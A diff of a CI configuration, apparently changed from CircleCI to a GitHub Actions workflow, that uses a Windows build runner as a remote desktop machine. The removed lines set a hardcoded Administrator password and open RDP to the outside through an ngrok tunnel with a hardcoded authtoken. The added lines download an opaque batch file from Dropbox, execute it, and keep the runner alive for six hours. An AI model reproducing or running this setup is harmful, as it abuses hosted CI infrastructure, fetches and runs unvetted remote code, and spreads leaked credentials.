@@ -1,22 +1,18 @@
-version: 2.1 
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
+name: GetScreen Windows (6H)
+
+on:
+  workflow_dispatch:
+
 jobs:
-  build: 
-    executor:
-      name: win/default 
-      size: "medium" 
- 
+  build:
+    runs-on: windows-latest
+
     steps:
-      - checkout      
-      - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "97gXYHBDtPYWwM" -Force)
-      - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
-      - run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-      - run: tar xf ngrok.zip
-      - run: Copy ngrok.exe C:\Windows\System32
-      - run: cmd /c echo ./ngrok.exe authtoken "2caqWBQVoYQ8tFdfh1RUny9guLb_szcVjAsyVaG6Qq1HXfAH" >a.ps1
-      - run: cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
-      - run: cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
-      - run: .\a.ps1
+      - name: Downloading & Setting Up
+        run: |
+         echo "duyi.ng.21.4.5@gmail.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
+
+      - name: Time Counter
+        run: Start-Sleep -Seconds 21600
